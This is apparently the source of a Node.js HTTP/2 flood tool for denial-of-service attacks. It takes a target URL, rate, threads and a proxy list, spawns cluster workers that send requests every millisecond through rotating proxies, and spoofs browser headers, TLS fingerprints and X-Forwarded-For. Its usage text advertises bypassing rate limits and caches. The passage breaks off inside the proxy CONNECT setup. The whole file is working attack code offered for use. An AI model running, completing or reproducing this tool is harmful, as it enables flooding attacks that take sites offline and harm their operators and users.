const argsris = process.argv.slice(2);
const queryIndexris = argsris.indexOf('--debug');
ris = queryIndexris !== -1 ? argsris[queryIndexris + 1] : null;
const errorHandler = error => {
    
      //console.log(error);
    
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
const colors = require('colors');
const net = require("net")
const url = require('url');
const fs = require('fs');
const http2 = require('http2');
const http = require('http');
const tls = require('tls');
const cluster = require('cluster');
const crypto = require('crypto');
const os = require("os");
const v8 = require('v8');
const HPACK = require('hpack');
const methodss = ["GET", "POST", "HEAD"]
let maprate = []
const dfcp = crypto.constants.defaultCoreCipherList.split(":");

const cipher = [
  'TLS_AES_128_GCM_SHA256',
  'TLS_AES_256_GCM_SHA384',
  'TLS_CHACHA20_POLY1305_SHA256',
      dfcp[0],
       dfcp[1],
        dfcp[2],
         dfcp[3],
          ...dfcp.slice(3),
].join(":");
const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];
const encoding = [
    'gzip', 'br', 'deflate', 'zstd', 'identity', 'compress', 'x-bzip2', 'x-gzip',
    'lz4', 'lzma', 'xz', 'zlib',
    'gzip, br', 'gzip, deflate', 'gzip, zstd', 'gzip, lz4', 'gzip, lzma',
    'gzip, xz', 'gzip, zlib', 'br, deflate', 'br, zstd', 'br, lz4',
    'br, lzma', 'br, xz', 'br, zlib', 'deflate, zstd', 'deflate, lz4',
    'deflate, lzma', 'deflate, xz', 'deflate, zlib', 'zstd, lz4',
    'zstd, lzma', 'zstd, xz', 'zstd, zlib', 'lz4, lzma', 'lz4, xz',
    'lz4, zlib', 'lzma, xz', 'lzma, zlib', 'xz, zlib',
    'gzip, br, deflate', 'gzip, br, zstd', 'gzip, br, lz4', 'gzip, br, lzma',
    'gzip, br, xz', 'gzip, br, zlib', 'gzip, deflate, zstd', 'gzip, deflate, lz4',
    'gzip, deflate, lzma', 'gzip, deflate, xz', 'gzip, deflate, zlib', 'gzip, zstd, lz4',
    'gzip, zstd, lzma', 'gzip, zstd, xz', 'gzip, zstd, zlib', 'gzip, lz4, lzma',
    'gzip, lz4, xz', 'gzip, lz4, zlib', 'gzip, lzma, xz', 'gzip, lzma, zlib',
    'gzip, xz, zlib', 'br, deflate, zstd', 'br, deflate, lz4', 'br, deflate, lzma',
    'br, deflate, xz', 'br, deflate, zlib', 'br, zstd, lz4', 'br, zstd, lzma',
    'br, zstd, xz', 'br, zstd, zlib', 'br, lz4, lzma', 'br, lz4, xz',
    'br, lz4, zlib', 'br, lzma, xz', 'br, lzma, zlib', 'br, xz, zlib',
    'deflate, zstd, lz4', 'deflate, zstd, lzma', 'deflate, zstd, xz', 'deflate, zstd, zlib',
    'deflate, lz4, lzma', 'deflate, lz4, xz', 'deflate, lz4, zlib', 'deflate, lzma, xz',
    'deflate, lzma, zlib', 'deflate, xz, zlib', 'zstd, lz4, lzma', 'zstd, lz4, xz',
    'zstd, lz4, zlib', 'zstd, lzma, xz', 'zstd, lzma, zlib', 'zstd, xz, zlib',
    'lz4, lzma, xz', 'lz4, lzma, zlib', 'lz4, xz, zlib', 'lzma, xz, zlib',
    'gzip, br, deflate, zstd', 'gzip, br, deflate, lz4', 'gzip, br, deflate, lzma',
    'gzip, br, deflate, xz', 'gzip, br, deflate, zlib', 'gzip, br, zstd, lz4',
    'gzip, br, zstd, lzma', 'gzip, br, zstd, xz', 'gzip, br, zstd, zlib',
    'gzip, br, lz4, lzma', 'gzip, br, lz4, xz', 'gzip, br, lz4, zlib',
    'gzip, br, lzma, xz', 'gzip, br, lzma, zlib', 'gzip, br, xz, zlib',
    'gzip, deflate, zstd, lz4', 'gzip, deflate, zstd, lzma', 'gzip, deflate, zstd, xz',
    'gzip, deflate, zstd, zlib', 'gzip, deflate, lz4, lzma', 'gzip, deflate, lz4, xz',
    'gzip, deflate, lz4, zlib', 'gzip, deflate, lzma, xz', 'gzip, deflate, lzma, zlib',
    'gzip, deflate, xz, zlib', 'gzip, zstd, lz4, lzma', 'gzip, zstd, lz4, xz',
    'gzip, zstd, lzma, xz', 'gzip, zstd, lzma, zlib', 'gzip, zstd, xz, zlib',
    'gzip, lz4, lzma, xz', 'gzip, lz4, lzma, zlib', 'gzip, lz4, xz, zlib',
    'gzip, lzma, xz, zlib', 'br, deflate, zstd, lz4', 'br, deflate, zstd, lzma',
    'br, deflate, zstd, xz', 'br, deflate, zstd, zlib', 'br, deflate, lz4, lzma',
    'br, deflate, lz4, xz', 'br, deflate, lz4, zlib', 'br, deflate, lzma, xz',
    'br, deflate, lzma, zlib', 'br, deflate, xz, zlib', 'br, zstd, lz4, lzma',
    'br, zstd, lz4, xz', 'br, zstd, lzma, xz', 'br, zstd, lzma, zlib',
    'br, zstd, xz, zlib', 'br, lz4, lzma, xz', 'br, lz4, lzma, zlib',
    'br, lz4, xz, zlib', 'br, lzma, xz, zlib', 'deflate, zstd, lz4, lzma',
    'deflate, zstd, lz4, xz', 'deflate, zstd, lzma, xz', 'deflate, zstd, lzma, zlib',
    'deflate, zstd, xz, zlib', 'deflate, lz4, lzma, xz', 'deflate, lz4, lzma, zlib',
    'deflate, lz4, xz, zlib', 'deflate, lzma, xz, zlib', 'zstd, lz4, lzma, xz',
    'zstd, lz4, lzma, zlib', 'zstd, lz4, xz, zlib', 'zstd, lzma, xz, zlib',
    'lz4, lzma, xz, zlib'
];
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
const headerFunc = {
    cipher() {
        return cplist[Math.floor(Math.random() * cplist.length)];
    },
    sigalgs() {
        return sigalgs[Math.floor(Math.random() * sigalgs.length)];
    },
}
process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[5];
const proxyFile = process.argv[6];
let rps = process.argv[4];
// Validate input
if (!target || !time || !rps || !thread || !proxyFile) {
    
    console.error(`
Usage: node ${process.argv[1]} url time rate thread proxy `);
    console.log(`
Options:
--ratelimit : bypass ratelimit 
--redirect : follow new url 301 302 307
--query : use query string to bypass cache
 `)   
    process.exit(1);
}
// Validate target format
if (!/^https?:\/\//i.test(target)) {
    console.error('sent with http:// or https://');
    process.exit(1);
}
// Parse proxy list
let proxys = [];
try {
    const proxyData = fs.readFileSync(proxyFile, 'utf-8');
    proxys = proxyData.match(/\S+/g);
} catch (err) {
    console.error('Error proxy file:', err.message);
    process.exit(1);
}
// Validate RPS value
if (isNaN(rps) || rps <= 0) {
    console.error('number rps');
    process.exit(1);
}
const proxyr = () => {
    return proxys[Math.floor(Math.random() * proxys.length)];
}
let randbyte = 1
setInterval(()=>{
 randbyte = Math.floor(Math.random() * 5) + 1;
},5000)
function shuffleObject(obj) {
    const keys = Object.keys(obj);
    const shuffledKeys = keys.reduce((acc, _, index, array) => {
        const randomIndex = Math.floor(Math.random() * (index + 1));
        acc[index] = acc[randomIndex];
        acc[randomIndex] = keys[index];
        return acc;
    }, []);
    const shuffledObject = Object.fromEntries(shuffledKeys.map((key) => [key, obj[key]]));
    return shuffledObject;
}







function generateRandomString(minLength, maxLength) {
    const characters = 'aqwertyuiopsdfghjlkzxcvbnm';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({
        length
    }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}
const argstos = process.argv.slice(2);
const queryIndextos = argstos.indexOf('--status');
tos = queryIndextos !== -1 ? argstos[queryIndextos + 1] : null;
const queryIndexcoo = argstos.indexOf('--cookie');
coo = queryIndexcoo !== -1 ? argstos[queryIndexcoo + 1] : null;

let cookie = ''
if (coo === "true") {
    "cache_push=" + generateRandomString(30, 100) + "; date=" + Date.now()
}
if (tos === 'true') {
    setInterval(printStatusCounts, 30000);
}


function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}



function randomDelay(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
interval = randomDelay(100, 500);
const MAX_RAM_PERCENTAGE = 95;
const RESTART_DELAY = 100;

if (cluster.isMaster) {
    function readServerInfo() {
        const load = (Math.random() * 100).toFixed(2);
        const memory = (Math.random() * 8).toFixed(2);
        const currentTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Bangkok', hour: '2-digit', minute: '2-digit', second: '2-digit' });
        process.stdout.cursorTo(0, 6);
        process.stdout.clearLine();
        process.stdout.write(`CPU Load: ${load}%, Memory Usage: ${memory}GB, Time: ${currentTime}`.bgCyan);
    }
    
    setInterval(readServerInfo, 1000);
    
    console.clear();
    console.log(
        '   /\\'.rainbow + '\n' +
        '  /  \\'.rainbow + '\n' +
        ' / /\\ \\'.rainbow + '\n' +
        '/_/  \\_\\'.rainbow
    );
    console.log('HEAP SIZE:', (v8.getHeapStatistics().heap_size_limit / (1024 * 1024)).toFixed(2), 'MB');
    
    const updateLoading = (percentage, delay) => {
        setTimeout(() => {
            process.stdout.cursorTo(0, 5);
            process.stdout.write(`Loading: ${percentage}%`.green);
        }, delay);
    };
    
    updateLoading(10, 0);
    updateLoading(50, 500 * time);
    updateLoading(100, time * 1000);

    const restartScript = () => {
        Object.values(cluster.workers).forEach(worker => worker.kill());
        console.log(`[<>] Restarting...`);
        setTimeout(() => {
            for (let i = 0; i < thread; i++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log(`[<!>] Maximum RAM `);
            restartScript();
        }
    };


    setInterval(handleRAMUsage, 5000);

    for (let i = 0; i < thread; i++) {
        cluster.fork();
    }

    setTimeout(() =>{ console.clear(); process.exit(-1)}, time * 1000);
} else {
    setInterval(() => {
        flood();
    }, 1);
}
const reswritedata = (req) => {
  req.on('data', () => {});
};
async function flood() {
    let sigals = headerFunc.sigalgs();
    let parsed = url.parse(target);
    const currentTime = Date.now();
        maprate = maprate.filter(limit => currentTime - limit.timestamp <= 60000);
        (() => {
            const currentTime = Date.now();
            maprate = maprate.filter(limit => currentTime - limit.timestamp <= 60000);
        })();
        let proxy;
        do {
            proxy = proxyr().split(':');
        } while (maprate.some(limit => limit.proxy === proxy[0] && (Date.now() - limit.timestamp) < 60000));
const parseBoolean = (value) => value === "true";

const getArgumentValue = (args, flag, defaultValue = null) => {
    const index = args.indexOf(flag);
    return index !== -1 ? args[index + 1] : defaultValue;
};

const bypassconnect = process.argv.slice(2);

const ratelimit0 = parseBoolean(getArgumentValue(bypassconnect, '--ratelimit', "false"));
const query = getArgumentValue(process.argv.slice(7), '--query', null);
const redirect = parseBoolean(getArgumentValue(bypassconnect, "--redirect", false))
    
    


    
    let path = parsed.path
    if (parsed.path.includes('%rand%')) {
        path = parsed.path.replace("%rand%", generateRandomString(5, 7))
    } else {
        setInterval(() => {
            path = parsed.path //+ "?cache_bush=" + Date.now()
        }, 1000);
    }
const DAY = ["Mon","Tue","Wed","Thu","Fri","Sat","Sun"];
const DAY1 = getRandomInt(1,30);
const month = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];

var day = DAY[Math.floor(Math.floor(Math.random() * DAY.length))];
var day1 = month[Math.floor(Math.floor(Math.random() * month.length))];

const hell = day+ " " + DAY1 + " " + day1;

    const type = [
    "text/plain"
    , "text/html"
    , "application/json"
    , "application/xml"
    , "multipart/form-data"
    , "application/octet-stream"
    , "image/jpeg"
    , "image/png"
    , "audio/mpeg"
    , "video/mp4"
    , "application/javascript"
    , "application/pdf"
    , "application/vnd.ms-excel"
    , "application/vnd.ms-powerpoint"
    , "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
    , "application/vnd.openxmlformats-officedocument.presentationml.presentation"
    , "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
    , "application/zip"
    , "image/gif"
    , "image/bmp"
    , "image/tiff"
    , "audio/wav"
    , "audio/midi"
    , "video/avi"
    , "video/mpeg"
    , "video/quicktime"
    , "text/csv"
    , "text/xml"
    , "text/css"
    , "text/javascript"
    , "application/graphql"
    , "application/x-www-form-urlencoded"
    , "application/vnd.api+json"
    , "application/ld+json"
    , "application/x-pkcs12"
    , "application/x-pkcs7-certificates"
    , "application/x-pkcs7-certreqresp"
    , "application/x-pem-file"
    , "application/x-x509-ca-cert"
    , "application/x-x509-user-cert"
    , "application/x-x509-server-cert"
    , "application/x-bzip"
    , "application/x-gzip"
    , "application/x-7z-compressed"
    , "application/x-rar-compressed"
    , "application/x-shockwave-flash"
  ];


const method = [
"GET",
"HEAD",
];

const mmb  = method[Math.floor(Math.floor(Math.random() * method.length))];

const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx"];

const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};

const transformSettings = (settings) => {
    const settingsMap = {
        "SETTINGS_HEADER_TABLE_SIZE": 0x1,
        "SETTINGS_ENABLE_PUSH": 0x2,
        "SETTINGS_MAX_CONCURRENT_STREAMS": 0x3,
        "SETTINGS_INITIAL_WINDOW_SIZE": 0x4,
        "SETTINGS_MAX_FRAME_SIZE": 0x5,
        "SETTINGS_MAX_HEADER_LIST_SIZE": 0x6
    };
    return settings.map(([key, value]) => [settingsMap[key], value]);
};

const h2Settings = (browser) => {
    const settings = {
        brave: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        chrome: [
            ["SETTINGS_HEADER_TABLE_SIZE", 4096],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        firefox: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        mobile: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        opera: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        operagx: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        safari: [
            ["SETTINGS_HEADER_TABLE_SIZE", 4096],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ]
    };
    return Object.fromEntries(settings[browser]);
};
const generateHeaders = (browser) => {
    const versions = {
        chrome: { min: 1, max: 136 },
        safari: { min: 1, max: 136 },
        brave: { min: 1, max: 136 },
        firefox: { min: 1, max: 136 },
        mobile: { min: 1, max: 136 },
        opera: { min: 1, max: 136 },
        operagx: { min: 1, max: 136 }
    };

    const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;
   

    
    const platforms = {
        chrome: "Cloudflare",
        safari: "Cloudflare",
        brave: "Cloudflare",
        firefox: "Cloudflare",
        mobile: "Cloudflare",
        opera: "Cloudflare",
        operagx: "Cloudflare"
    };
    const platform = platforms[browser];

    const userAgent = {
        chrome: `Mozilla/5.0.${generateRandomString(1,10)} (Cloudflare NT.${generateRandomString(60,3000)}.${generateRandomString(60,3000)} QOQ${generateRandomString(32,64)}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        safari: `Mozilla/5.0.${generateRandomString(1,10)} (Cloudflare NT.${generateRandomString(60,3000)}.${generateRandomString(60,3000)} QOQ${generateRandomString(32,64)}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        brave: `Mozilla/5.0.${generateRandomString(1,10)} (Cloudflare NT.${generateRandomString(60,3000)}.${generateRandomString(60,3000)} QOQ${generateRandomString(32,64)}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        firefox: `Mozilla/5.0.${generateRandomString(1,10)} (Cloudflare NT.${generateRandomString(60,3000)}.${generateRandomString(60,3000)} QOQ${generateRandomString(32,64)}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        mobile: `Mozilla/5.0.${generateRandomString(1,10)} (Cloudflare NT.${generateRandomString(60,3000)}.${generateRandomString(60,3000)} QOQ${generateRandomString(32,64)}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        opera: `Mozilla/5.0.${generateRandomString(1,10)} (Cloudflare NT.${generateRandomString(60,3000)}.${generateRandomString(60,3000)} QOQ${generateRandomString(32,64)}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        operagx: `Mozilla/5.0.${generateRandomString(1,10)} (Cloudflare NT.${generateRandomString(60,3000)}.${generateRandomString(60,3000)} QOQ${generateRandomString(32,64)}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`
    };

 const headersMap = {
        brave: {
    "sec-ch-ua": `"Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": platform,
    "upgrade-insecure-requests": "1",
    "user-agent": userAgent.chrome,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-encoding": encoding[Math.floor(Math.random() * encoding.length)],
    "accept-language": "en-US,en;q=0.9,vi;q=0.8",
    "sec-fetch-site": "none",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    
    // Các header phụ hoặc không chuẩn trình duyệt (đặt sau cùng):
    "content-type": type[Math.floor(Math.random() * type.length)],
    "priority": `u=${randbyte}, i`,
    "x-forwarded-for": proxy[0],
    "age": getRandomInt(4000, 10000),
    "expires": day + DAY1 + day1

},
        chrome: {

    "sec-ch-ua": `"Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": platform,
    "upgrade-insecure-requests": "1",
    "user-agent": userAgent.chrome,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-encoding": encoding[Math.floor(Math.random() * encoding.length)],
    "accept-language": "en-US,en;q=0.9,vi;q=0.8",
    "sec-fetch-site": "none",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    
    // Các header phụ hoặc không chuẩn trình duyệt (đặt sau cùng):
    "content-type": type[Math.floor(Math.random() * type.length)],
    "priority": `u=${randbyte}, i`,
    "x-forwarded-for": proxy[0],
    "age": getRandomInt(4000, 10000),
    "expires": day + DAY1 + day1

},
        firefox: {
    "sec-ch-ua": `"Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": platform,
    "upgrade-insecure-requests": "1",
    "user-agent": userAgent.chrome,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-encoding": encoding[Math.floor(Math.random() * encoding.length)],
    "accept-language": "en-US,en;q=0.9,vi;q=0.8",
    "sec-fetch-site": "none",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    
    // Các header phụ hoặc không chuẩn trình duyệt (đặt sau cùng):
    "content-type": type[Math.floor(Math.random() * type.length)],
    "priority": `u=${randbyte}, i`,
    "x-forwarded-for": proxy[0],
    "age": getRandomInt(4000, 10000),
    "expires": day + DAY1 + day1


},
        safari: {
    "sec-ch-ua": `"Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": platform,
    "upgrade-insecure-requests": "1",
    "user-agent": userAgent.chrome,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-encoding": encoding[Math.floor(Math.random() * encoding.length)],
    "accept-language": "en-US,en;q=0.9,vi;q=0.8",
    "sec-fetch-site": "none",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    
    // Các header phụ hoặc không chuẩn trình duyệt (đặt sau cùng):
    "content-type": type[Math.floor(Math.random() * type.length)],
    "priority": `u=${randbyte}, i`,
    "x-forwarded-for": proxy[0],
    "age": getRandomInt(4000, 10000),
    "expires": day + DAY1 + day1

},
        mobile: {
    "sec-ch-ua": `"Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": platform,
    "upgrade-insecure-requests": "1",
    "user-agent": userAgent.chrome,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-encoding": encoding[Math.floor(Math.random() * encoding.length)],
    "accept-language": "en-US,en;q=0.9,vi;q=0.8",
    "sec-fetch-site": "none",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    
    // Các header phụ hoặc không chuẩn trình duyệt (đặt sau cùng):
    "content-type": type[Math.floor(Math.random() * type.length)],
    "priority": `u=${randbyte}, i`,
    "x-forwarded-for": proxy[0],
    "age": getRandomInt(4000, 10000),
    "expires": day + DAY1 + day1

},
        opera: {
    "sec-ch-ua": `"Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": platform,
    "upgrade-insecure-requests": "1",
    "user-agent": userAgent.chrome,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-encoding": encoding[Math.floor(Math.random() * encoding.length)],
    "accept-language": "en-US,en;q=0.9,vi;q=0.8",
    "sec-fetch-site": "none",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    
    // Các header phụ hoặc không chuẩn trình duyệt (đặt sau cùng):
    "content-type": type[Math.floor(Math.random() * type.length)],
    "priority": `u=${randbyte}, i`,
    "x-forwarded-for": proxy[0],
    "age": getRandomInt(4000, 10000),
    "expires": day + DAY1 + day1

},
        operagx: {   
    "sec-ch-ua": `"Chromium";v="${version}", "Google Chrome";v="${version}", "Not-A.Brand";v="99"`,
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": platform,
    "upgrade-insecure-requests": "1",
    "user-agent": userAgent.chrome,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-encoding": encoding[Math.floor(Math.random() * encoding.length)],
    "accept-language": "en-US,en;q=0.9,vi;q=0.8",
    "sec-fetch-site": "none",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    
    // Các header phụ hoặc không chuẩn trình duyệt (đặt sau cùng):
    "content-type": type[Math.floor(Math.random() * type.length)],
    "priority": `u=${randbyte}, i`,
    "x-forwarded-for": proxy[0],
    "age": getRandomInt(4000, 10000),
    "expires": day + DAY1 + day1

}
};

    return headersMap[browser];
};
const browser = getRandomBrowser();
const header = generateHeaders(browser);
let h2_config;
const h2settings = h2Settings(browser);
h2_config = transformSettings(Object.entries(h2settings));

function randstr(length) {
        const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let result = "";
        const charactersLength = characters.length;
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        return result;
    }

function randstra(length) {
    const characters = "0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
    
    const datafloor = Math.floor(Math.random() * 3)
    let mathfloor
    let rada
    switch (datafloor) {
        case 0:
            mathfloor = 6291456;
            rada = 128;
            break
        case 1:
            mathfloor = 65535;
            rada = 256;
            break
        case 2:
            mathfloor = 262144 ;
            rada = 110;
            break
    }




    
    const TLSOPTION = {
        ciphers: cipher,
        sigalgs: sigals,
        minVersion: "TLSv1.3",
        maxVersion: "TLSv1.3",
        secure: true,
        rejectUnauthorized: false,
        ALPNProtocols: ['h2'],
        requestOCSP: false,
        sessionTimeout: 300,
        honorCipherOrder: true
    };
    async function createCustomTLSSocket(parsed, socket) {
        const tlsSocket = await tls.connect({
            ...TLSOPTION,
            host: parsed.host,
            port: 443,
            servername: parsed.host,
            socket: socket
        });
        return tlsSocket;
    }

                    
    const closeConnections = (client, connection,tlsSocket, socket, threaf) => {
        if (client) client.destroy();
        if (socket) socket.end();
        if (connection) connection.destroy()
        if (tlsSocket) tlsSocket.end();
        if (threaf) clearInterval(threaf);  
}
    let procxy = []
    for (let o = 0; o < rps; o++) {
        const agent = await new http.Agent({
            host: proxy[0],
            port: proxy[1],
            keepAlive: true,
            keepAliveMsecs: Infinity,
            maxSockets: Infinity,
            maxTotalSockets: Infinity,
        });
        const Optionsreq = {
            agent: agent,
            method: 'CONNECT',
            path: parsed.host + ':443',
            timeout: 5000,
            headers: {
                'Host': parsed.host,
                'Proxy-Connection': 'Keep-Alive',
                'Connection': 'Keep-Alive',
